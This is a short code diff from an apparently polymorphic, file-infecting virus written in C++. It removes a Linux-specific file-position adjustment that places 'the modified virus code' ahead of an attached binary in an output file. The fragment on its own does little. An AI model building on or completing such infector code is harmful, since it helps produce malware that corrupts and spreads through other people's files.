@@ -272,17 +272,6 @@ namespace poly {
         } else {
             this->editor_->save_changes(out);
 
-            if (!this->is_first_execution()) {
-                // this must be done because on Linux the call to
-                // this->editor_->save_changes(...); writes back also the
-                // attached binary (this behaviour is not present on windows or
-                // macos). On Windows and MacOS this call should not move the
-                // output position index, on linux this should place the output
-                // position index right after the modified virus code
-                out.seekg(this->total_size_ - sizeof(std::uint64_t) -
-                          sizeof(Address) - this->attached_file_size_);
-            }
-
             out.write(reinterpret_cast<char *>(target_content.data()),
                       target_size);
 
